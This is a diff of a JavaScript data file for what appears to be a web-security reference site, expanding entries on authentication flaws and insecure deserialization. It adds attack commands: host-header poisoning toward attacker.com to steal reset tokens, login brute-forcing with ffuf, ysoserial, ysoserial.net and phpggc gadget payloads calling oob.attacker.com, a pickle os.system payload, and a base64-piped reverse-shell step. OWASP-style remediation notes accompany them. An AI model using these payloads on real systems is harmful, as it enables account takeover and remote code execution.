+              "Session: is a fresh session id issued at login and at privilege change, is the old one killed, and is logout a true server-side invalidation (not just a cookie delete)?",
+              "Recovery: are reset/verification tokens high-entropy, single-use, short-lived, and bound to the exact user — and are reset links built from a fixed base URL rather than request-controlled headers?",
+              "Leftovers: default vendor credentials, seeded test/admin accounts, and 'backdoor' debug logins that were never removed."
+            ]
+          },
+          {
+            title: "Step 1 — Test the Login Flow",
             type: "commands",
             commands: [
-              { label: "1. Map every step and reach later ones directly", cmd: "# walk the full flow: login -> mfa -> dashboard\n# then request the post-auth endpoint straight after step 1:\nGET /account/dashboard   (with the half-authenticated cookie)\n# if it loads, the 2FA step is not enforced server-side" },
-              { label: "2. Tamper client-trusted signals", cmd: "# intercept the MFA/login response and flip the decision:\n{\"mfa\":\"fail\"}  ->  {\"mfa\":\"pass\"}\n{\"success\":false} -> true\n# or set a role/verified flag the server later reads without re-checking" },
-              { label: "3. Attack password reset", cmd: "# inspect the reset token: entropy, whether it is bound to the user, reuse\n# host-header poisoning to steal the reset link:\nPOST /reset  Host: attacker.com   email=victim@corp\n# victim's link now points to attacker.com -> token captured" },
-              { label: "4. Analyse session tokens", cmd: "# is the session id rotated on login? predictable? invalidated on logout?\n# session fixation: set a known id pre-login, see if it survives authentication\n# no rotation on privilege change -> fixation / hijack" },
-              { label: "5. Try default and leftover accounts", cmd: "# admin panels and appliances often keep defaults:\nadmin:admin   admin:password   <product-default>\n# and old test accounts that were never removed" }
+              { label: "Username enumeration", cmd: "# compare responses for a known-good vs random username\n# look for: different error text, different HTTP status, response-time delta\nvalid@corp   -> 'Incorrect password'\nrandom@corp  -> 'No such user'      # <- enumeration oracle\n# also check registration and reset for the same tell" },
+              { label: "Rate-limiting / lockout", cmd: "# fire N wrong passwords and see if you are throttled or locked\nffuf -w passwords.txt -u https://t/login -X POST -d 'user=admin&pass=FUZZ' -mc all\n# no lockout / no captcha after many tries = brute force & stuffing viable\n# check whether lockout is per-account (bypass by rotating usernames)" },
+              { label: "Response manipulation", cmd: "# intercept the login/2fa RESPONSE and flip the verdict the client trusts:\n{\"authenticated\":false} -> true\nHTTP/1.1 401 -> 200 with a crafted body\n# works when the front-end, not the server, decides what happens next" },
+              { label: "Forced browsing past a factor", cmd: "# authenticate step 1 only, then hit the post-MFA page directly:\nGET /account   Cookie: <half-authenticated session>\n# loads = the MFA gate is client-side / not enforced on the resource" }
+            ]
+          },
+          {
+            title: "Step 2 — Session & MFA Weaknesses",
+            type: "commands",
+            commands: [
+              { label: "Session not regenerated on login", cmd: "# note the session id BEFORE login, log in, compare AFTER\n# same id = session fixation risk: an attacker who plants that id\n# (via a link, an XSS, or a shared value) rides the victim's session" },
+              { label: "Logout / invalidation", cmd: "# capture an authenticated request, log out, then REPLAY the old cookie/token\n# still works = session not invalidated server-side (only cookie cleared)" },
+              { label: "Token predictability", cmd: "# collect many session ids / reset tokens and inspect for structure:\n# sequential, timestamp-based, short, or low-entropy = guessable\n# quantify with Burp Sequencer" },
+              { label: "MFA-specific bypasses", cmd: "# skip the MFA request entirely and proceed; reuse a prior 'mfa_passed' flag;\n# brute force a short OTP without rate limit; replay a used OTP;\n# see the OTP / 2FA Bypass entry for the full matrix" }
+            ]
+          },
+          {
+            title: "Step 3 — Attack Password Reset",
+            type: "commands",
+            commands: [
+              { label: "Token analysis", cmd: "# request several reset tokens for accounts you control and inspect:\n# - entropy (is it guessable / sequential / a hashed timestamp?)\n# - is it bound to the user, or can token(A) reset account(B)?\n# - does it expire, and can it be used more than once?" },
+              { label: "Host-header poisoning of the reset link", cmd: "POST /forgot-password\nHost: attacker.com\nX-Forwarded-Host: attacker.com\n\nemail=victim@corp\n# if the emailed link is https://attacker.com/reset?token=... you capture\n# the victim's token when they click (see Host Header Injection)" },
+              { label: "Parameter / flow tampering", cmd: "# reset for your account, then swap the user id/email in the confirm step:\nPOST /reset/confirm  token=<yours>&user=victim   # IDOR in recovery\n# or add a second email param (parameter pollution) to redirect the mail" },
+              { label: "Account takeover via linking", cmd: "# pre-register with a victim's email before they sign up via SSO,\n# or abuse unverified-email acceptance so your account binds to theirs" }
             ]
           },
           {
@@ -1663,22 +1831,24 @@ var VULNS = [
             type: "table",
             columns: ["Class", "Example"],
             rows: [
-              ["Broken MFA", "The second factor is not enforced server-side, or its verified state can be forged/skipped"],
-              ["Logic flaws", "Register/login race conditions, unverified email accepted, 'remember me' that never checks"],
-              ["Session management", "No rotation on privilege change, predictable tokens, missing invalidation on logout"],
-              ["Password reset", "Guessable reset tokens, tokens reusable or not user-bound, reset link host from Host header"],
-              ["Default/weak accounts", "Leftover test/admin accounts and default credentials"]
+              ["Broken MFA", "Second factor enforced only in the UI; verified state forgeable; post-MFA endpoint reachable directly"],
+              ["Login logic", "Username enumeration, no rate-limit/lockout, response manipulation, timing side-channels"],
+              ["Session management", "No regeneration on login/priv-change, predictable ids, no server-side invalidation on logout"],
+              ["Password reset", "Guessable/non-expiring/reusable tokens, token not user-bound, reset host from Host header"],
+              ["Recovery logic", "IDOR in the confirm step, parameter pollution of the target email, pre-account-takeover"],
+              ["Default/weak accounts", "Vendor defaults, seeded test/admin accounts, debug backdoors"]
             ]
           },
           {
-            title: "Attack Chain",
+            title: "Impact & Attack Chain",
             type: "table",
             columns: ["Step", "Action", "Result"],
             rows: [
-              ["1", "Map the full auth/reset flow", "Understand each enforced step"],
-              ["2", "Skip a step or tamper a signal", "Server accepts an unproven state"],
-              ["3", "Or capture/forge a reset token", "Control of the reset link"],
-              ["4", "Authenticate as the victim", "Account takeover / MFA defeat"]
+              ["1", "Map the full auth / MFA / reset flow", "Every enforced (and unenforced) step is known"],
+              ["2", "Skip a step, tamper a signal, or replay", "Server accepts an unproven authenticated state"],
+              ["3", "Or capture/forge a reset or session token", "Control of the account's credential path"],
+              ["4", "Authenticate as the victim", "Account takeover / MFA defeat"],
+              ["5", "If the flaw is systemic", "Mass compromise across the user base"]
             ]
           },
           {
@@ -1686,28 +1856,33 @@ var VULNS = [
             type: "table",
             columns: ["Tool", "Purpose"],
             rows: [
-              ["Burp Suite", "Flow mapping, response tampering, reset-token analysis"],
-              ["hydra / ffuf", "Test default credentials and login rate-limiting"],
-              ["custom scripts", "Measure reset/session token entropy"]
+              ["Burp Suite (Repeater/Intruder)", "Flow mapping, response tampering, reset-token capture, forced browsing"],
+              ["Burp Sequencer", "Measure entropy/predictability of session and reset tokens"],
+              ["hydra / ffuf / medusa", "Credential stuffing, default-credential and rate-limit testing"],
+              ["custom scripts", "Bulk-collect and statistically analyse tokens; automate reset abuse"]
             ]
           },
           {
             title: "References",
             type: "references",
             items: [
+              { label: "PortSwigger — Authentication vulnerabilities (with labs)", url: "https://portswigger.net/web-security/authentication" },
               { label: "OWASP — Identification and Authentication Failures", url: "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" },
-              { label: "PortSwigger — Authentication vulnerabilities", url: "https://portswigger.net/web-security/authentication" }
+              { label: "OWASP — Authentication Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html" },
+              { label: "OWASP — Forgot Password Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html" }
             ]
           },
           {
             title: "Remediation",
             type: "notes",
             items: [
-              "Enforce every authentication step server-side; never trust a client-provided flag that a factor was satisfied.",
-              "Rotate the session identifier on login and on any privilege change; invalidate sessions fully on logout and reset.",
-              "Generate reset/verification tokens with high entropy, bind them to the user, expire them quickly, and allow one use.",
-              "Do not build reset links from the Host header; use a fixed, configured base URL.",
-              "Remove default and test accounts, enforce MFA on sensitive accounts, and rate-limit authentication endpoints."
+              "Enforce every authentication and MFA step server-side on the protected resource itself; never trust a client-supplied flag that a factor was satisfied or a step completed.",
+              "Regenerate the session identifier on login and on any privilege change, invalidate it fully server-side on logout and password reset, and set a sensible idle/absolute expiry.",
+              "Issue reset and verification tokens with high entropy from a CSPRNG, bind them to the exact user, make them single-use, and expire them within minutes.",
+              "Build reset and confirmation links from a fixed, configured base URL — never from the Host / X-Forwarded-Host header.",
+              "Return identical, generic responses (and comparable timing) for valid and invalid usernames on login, registration, and reset to prevent enumeration.",
+              "Apply rate-limiting, progressive delays, and account lockout/CAPTCHA to all authentication and recovery endpoints; alert on anomalies.",
+              "Remove default and test accounts, require MFA on sensitive/admin accounts, and enforce a strong password policy with breached-password checks."
             ]
           }
         ]
@@ -2119,46 +2294,77 @@ var VULNS = [
         severity: "Critical",
         ref: "https://portswigger.net/web-security/deserialization",
         description: "Deserializing attacker-controlled data instantiates dangerous object graphs, often leading to RCE.",
-        brief: "Serialization turns objects into a byte/stream format; deserialization rebuilds them. When an application deserializes data an attacker controls, and the runtime's classpath contains suitable 'gadget' classes, a crafted object graph triggers a chain of method calls during reconstruction — frequently ending in command execution.\n\nImpact: remote code execution as the app process, plus auth/logic bypass by tampering serialized fields. It affects Java, .NET, PHP, Python (pickle), Ruby, and Node, and is critical because it is often reachable in cookies, hidden fields, and view state without any special privilege.",
+        brief: "Serialization converts an in-memory object into a portable byte stream or string; deserialization reconstructs the object from that data. The vulnerability arises when an application deserializes data that an attacker can influence, because native deserializers do far more than copy fields — they instantiate classes and invoke lifecycle methods (readObject, __wakeup, __destruct, __reduce__) during reconstruction. If the runtime's classpath contains suitable 'gadget' classes, a carefully crafted object graph chains those method calls together into an arbitrary effect, most often command execution.\n\nCrucially, the attacker does not need the application's own classes to be exploitable — the gadgets come from common libraries already present (Apache Commons Collections, Spring, Groovy in Java; a wide range of framework classes in .NET, PHP, and Python). This is why a single deserialization of untrusted input is treated as critical: the sink plus a vulnerable library on the path is enough.\n\nIt affects Java (ObjectInputStream), .NET (BinaryFormatter, __VIEWSTATE, Json.NET with TypeNameHandling), PHP (unserialize object injection), Python (pickle/PyYAML), Ruby (Marshal/YAML), and Node (a handful of libraries). Impact is remote code execution as the app process, and — even short of RCE — authentication and logic bypass by tampering with serialized fields (roles, prices, user ids). It is dangerous because the data rides in ordinary places: cookies, hidden form fields, ViewState, API bodies, message-queue payloads, and uploaded files, usually with no special privilege required.",
         quickReference: [
-          { label: "Java serialized blob (spot it)", cmd: "Base64 starting rO0AB...   raw bytes AC ED 00 05" },
+          { label: "Java blob (spot it)", cmd: "Base64 starting rO0AB...   raw bytes AC ED 00 05" },
           { label: "Generate a Java gadget", cmd: "java -jar ysoserial.jar CommonsCollections5 \"id\" | base64 -w0" },
-          { label: "Safe detection (no RCE)", cmd: "ysoserial URLDNS \"http://you.oastify.com\"  — a DNS hit confirms the sink" },
-          { label: ".NET ViewState / PHP", cmd: "ysoserial.net for __VIEWSTATE; PHP object injection via unserialize()" }
+          { label: "Safe detection (no RCE)", cmd: "ysoserial URLDNS \"http://you.oastify.com\"  -> a DNS hit confirms the sink" },
+          { label: "PHP / .NET / Python tells", cmd: "O:4:\"User\": (PHP)   __VIEWSTATE= (.NET)   base64 gASV / \\x80\\x04 (pickle)" }
         ],
         sections: [
           {
-            title: "How It's Exploited",
-            type: "commands",
-            commands: [
-              { label: "1. Spot serialized data in traffic", cmd: "# Java:  base64 'rO0AB...'  or raw bytes  AC ED 00 05\n# .NET:  __VIEWSTATE=...   PHP:  O:4:\"User\":... / a:2:{...}\n# cookies, hidden fields, and API bodies are the usual carriers" },
-              { label: "2. Confirm safely with URLDNS (no RCE)", cmd: "java -jar ysoserial.jar URLDNS 'http://abcd.oastify.com' | base64 -w0\n# submit it where the blob is deserialized; a DNS lookup proves the sink\n# this triggers no code execution -> safe on production" },
-              { label: "3. Find a working gadget chain (Java)", cmd: "# probe likely libraries on the classpath:\nfor g in CommonsCollections5 CommonsCollections6 CommonsBeanutils1 Groovy1; do\n  java -jar ysoserial.jar $g 'nslookup $g.oastify.com' | base64 -w0; done\n# whichever fires the callback is the live chain" },
-              { label: "4. .NET ViewState / PHP variants", cmd: "# .NET (known machineKey or unprotected VIEWSTATE):\nysoserial.net -p ViewState -g TypeConfuseDelegate -c \"nslookup me.oastify.com\" ...\n# PHP object injection: craft a serialized object hitting a __wakeup/__destruct gadget" },
-              { label: "5. Weaponise with a benign proof", cmd: "# swap the command for an in-scope proof once a chain lands:\njava -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0\n# stop at 'id' / a callback unless full exploitation is authorised" }
+            title: "Root Cause & Mechanism",
+            type: "notes",
+            items: [
+              "Native deserializers rebuild arbitrary object types and run their magic/lifecycle methods automatically — so control of the input is control over which objects get constructed and which methods fire.",
+              "A gadget chain strings together method calls that each library author intended for benign use, but which combine to reach a sink like Runtime.exec, ProcessBuilder, or eval — the attacker supplies the object graph, the libraries supply the code.",
+              "You do not need source access or the app's own classes: the chain is built from dependencies already on the classpath, which is why generic tools (ysoserial, phpggc) work across targets.",
+              "Format tells: Java raw AC ED 00 05 / base64 rO0AB; PHP a:/O: strings from serialize(); .NET __VIEWSTATE and BinaryFormatter blobs; Python pickle opcodes (\\x80); Ruby Marshal \\x04\\x08.",
+              "Even without a code-exec gadget, tampering with the fields of a trusted serialized object (an authenticated=true flag, a role, a user id, a price) is an auth/logic bypass."
             ]
           },
           {
             title: "Where the Data Enters",
             type: "table",
-            columns: ["Location", "Format"],
+            columns: ["Location", "Format / note"],
             rows: [
-              ["Cookies / hidden fields", "Serialized session or state objects"],
-              ["ASP.NET __VIEWSTATE", ".NET serialized state (attack with ysoserial.net)"],
-              ["APIs / message queues", "RMI, JMX, T3 (WebLogic), AMQP payloads"],
-              ["File uploads", "Objects/session files the app deserializes"],
-              ["Content-Type tells", "application/x-java-serialized-object; PHP unserialize() inputs"]
+              ["Cookies / hidden fields", "Serialized session or state objects round-tripped through the client"],
+              ["ASP.NET __VIEWSTATE", ".NET serialized state — attack with ysoserial.net (needs machineKey or unprotected VS)"],
+              ["APIs / RPC / queues", "Java RMI/JMX, T3 (WebLogic), JMS/AMQP, gRPC payloads carrying objects"],
+              ["File uploads / imports", "Session files, cache entries, or 'import' features that deserialize"],
+              ["JSON with type info", "Json.NET TypeNameHandling, Jackson enableDefaultTyping, fastjson autoType"],
+              ["Content-Type tells", "application/x-java-serialized-object; PHP unserialize() inputs; pickle loads"]
             ]
           },
           {
-            title: "Attack Chain",
+            title: "Step 1 — Detect the Sink (Safely)",
+            type: "commands",
+            commands: [
+              { label: "Recognise serialized data", cmd: "# Java:  echo <cookie> | base64 -d | xxd | head   -> AC ED 00 05\n# PHP :  O:4:\"User\":2:{s:4:\"name\";...}   or  a:2:{...}\n# .NET :  __VIEWSTATE=/wEP...   Python: base64 that decodes to \\x80\\x04..." },
+              { label: "Java: URLDNS confirmation (no code exec)", cmd: "java -jar ysoserial.jar URLDNS 'http://abcd.oastify.com' | base64 -w0\n# submit where the blob is accepted; a DNS lookup proves deserialization\n# URLDNS runs NO commands -> safe to fire on production" },
+              { label: "PHP: harmless probe", cmd: "# if you can supply serialized input, a malformed object often throws a\n# revealing error; a __wakeup/__destruct with a side effect confirms the sink" },
+              { label: "Map the classpath / dependencies", cmd: "# error messages, JS bundles, and version endpoints leak library names\n# knowing Commons-Collections/Spring/Groovy versions narrows the gadget" }
+            ]
+          },
+          {
+            title: "Step 2 — Find a Live Gadget Chain",
+            type: "commands",
+            commands: [
+              { label: "Java (ysoserial) — spray likely chains via OOB", cmd: "for g in CommonsCollections5 CommonsCollections6 CommonsBeanutils1 Groovy1 Spring1 Hibernate1; do\n  java -jar ysoserial.jar $g \"nslookup $g.oob.attacker.com\" | base64 -w0\ndone\n# submit each; whichever fires the callback is the live chain on this classpath" },
+              { label: ".NET (ysoserial.net)", cmd: "ysoserial.exe -p ViewState -g TypeConfuseDelegate \\\n  --path='/page.aspx' --apppath='/' --decryptionalg='AES' --decryptionkey='...' \\\n  --validationalg='SHA1' --validationkey='...' -c \"nslookup me.oob.attacker.com\"\n# for BinaryFormatter/Json.NET sinks: -f BinaryFormatter -g TypeConfuseDelegate" },
+              { label: "PHP (phpggc)", cmd: "phpggc -l                       # list available gadget chains\nphpggc Laravel/RCE1 system id     # or Monolog/RCE, Symfony/RCE, WordPress/...\nphpggc -b Laravel/RCE1 system id  # base64 output ready to submit" },
+              { label: "Python / Ruby", cmd: "# Python pickle (only if the app pickle.loads untrusted input):\n#   class E: def __reduce__(self): return (os.system,(\"id\",))\n#   base64(pickle.dumps(E()))\n# Ruby: Marshal.load / YAML.load of attacker data -> universal gadget chains" }
+            ]
+          },
+          {
+            title: "Step 3 — Weaponise (Authorised Only)",
+            type: "commands",
+            commands: [
+              { label: "Swap the callback for a benign proof", cmd: "java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0\n# stop at 'id' / a DNS hit unless full exploitation is explicitly in scope" },
+              { label: "Field tampering (no gadget needed)", cmd: "# PHP object injection: change O:4:\"User\":...s:5:\"admin\";b:0  ->  b:1\n# .NET/Java: flip a serialized role/authenticated field the app trusts on read" },
+              { label: "Escalate to a shell", cmd: "# once a chain lands, run a reverse shell as the app process, then pivot\njava -jar ysoserial.jar CommonsCollections6 'bash -c {echo,<b64>}|{base64,-d}|bash'" }
+            ]
+          },
+          {
+            title: "Impact & Attack Chain",
             type: "table",
             columns: ["Step", "Action", "Result"],
             rows: [
-              ["1", "Spot serialized data", "Candidate deserialization sink"],
-              ["2", "Confirm with URLDNS (OOB)", "Sink verified without RCE"],
-              ["3", "Find a live gadget chain", "Code execution primitive"],
-              ["4", "Run a benign command", "RCE as the app process"]
+              ["1", "Spot serialized data in cookies/state/API", "Candidate deserialization sink"],
+              ["2", "Confirm with URLDNS / harmless probe", "Sink verified without running code"],
+              ["3", "Identify a live gadget chain for the stack", "Code-execution (or field-tamper) primitive"],
+              ["4", "Run a benign command / flip a trusted field", "RCE as the app, or auth/logic bypass"],
+              ["5", "Reverse shell + pivot", "Host and internal-network compromise"]
             ]
           },
           {
@@ -2166,29 +2372,33 @@ var VULNS = [
             type: "table",
             columns: ["Tool", "Purpose"],
             rows: [
-              ["ysoserial", "Generate Java deserialization gadget payloads"],
-              ["ysoserial.net", ".NET ViewState / deserialization payloads"],
-              ["Burp (+ Collaborator)", "Detect blobs and confirm via OOB callbacks"],
-              ["phpggc", "Generate PHP object-injection gadget chains"]
+              ["ysoserial", "Generate Java deserialization gadget payloads (incl. URLDNS)"],
+              ["ysoserial.net", ".NET ViewState / BinaryFormatter / Json.NET payloads"],
+              ["phpggc", "Generate PHP object-injection gadget chains for common frameworks"],
+              ["Burp + Collaborator", "Detect blobs, decode, and confirm via OOB callbacks"],
+              ["Freddy (Burp ext)", "Automatically flag deserialization sinks in traffic"]
             ]
           },
           {
             title: "References",
             type: "references",
             items: [
-              { label: "PortSwigger — Insecure deserialization", url: "https://portswigger.net/web-security/deserialization" },
-              { label: "OWASP — Deserialization Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html" }
+              { label: "PortSwigger — Insecure deserialization (with labs)", url: "https://portswigger.net/web-security/deserialization" },
+              { label: "OWASP — Deserialization Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html" },
+              { label: "OWASP WSTG — Testing for Object Deserialization", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files" },
+              { label: "PayloadsAllTheThings — Insecure Deserialization", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization" }
             ]
           },
           {
             title: "Remediation",
             type: "notes",
             items: [
-              "Do not deserialize untrusted data. Where you must exchange objects, use a simple data format (JSON) with a strict schema and no type resolution.",
-              "If native deserialization is unavoidable, use allow-list-based look-ahead deserialization that permits only expected classes.",
-              "Sign and integrity-check any serialized state you must round-trip through the client (e.g. keyed HMAC on ViewState).",
-              "Keep gadget-prone libraries updated and removed where unused; monitor for deserialization advisories.",
-              "Confirm findings with a benign OOB payload (URLDNS) rather than firing RCE on production."
+              "Do not deserialize untrusted data with a native serializer. Exchange data as JSON with a strict, explicit schema and no polymorphic type resolution.",
+              "Disable dangerous type handling: Json.NET TypeNameHandling.None, Jackson without enableDefaultTyping (or activateDefaultTyping with a strict validator), fastjson safeMode, and avoid PHP unserialize() on user input (use json_decode).",
+              "If native deserialization is unavoidable, use look-ahead / allow-list deserialization (e.g. Java's ObjectInputFilter, ValidatingObjectInputStream) that permits only the exact expected classes.",
+              "Never round-trip trusted state through the client unprotected — sign it with a server-side keyed HMAC and verify before deserializing (and keep the ViewState MAC enabled with a secret machineKey).",
+              "Keep gadget-prone libraries patched and remove unused dependencies to shrink the gadget surface; monitor deserialization advisories.",
+              "Run the app with least privilege and isolation, and confirm findings with a benign OOB payload (URLDNS) rather than firing RCE on production."
             ]
           }
         ]
